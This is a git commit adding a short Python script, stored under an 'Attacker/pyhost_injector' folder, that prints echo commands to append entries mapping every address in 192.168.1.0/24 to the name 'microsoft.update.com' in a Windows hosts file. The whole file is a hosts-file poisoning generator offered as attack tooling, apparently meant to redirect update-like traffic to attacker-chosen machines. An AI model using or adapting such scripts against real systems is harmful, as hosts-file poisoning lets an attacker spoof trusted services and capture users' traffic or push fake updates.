9bfcbcbc7f90b43f5a2352e3473422458e3c3e61
nu11secur1ty <venvaropt@gmail.com>
2019-11-22 10:58:18 +0200

    Create 19216811.py

---
+++ Attacker/pyhost_injector/19216811.py
@@ -0,0 +1,7 @@
+#!/usr/bin/python3
+# Author V.Varbanovski @nu11secur1ty
+# v-1.0
+import ipaddress
+for ip in ipaddress.IPv4Network('192.168.1.0/24'):
+    host = "microsoft.update.com >> %hostspath%"
+    print("echo",'',ip,'','','',host)
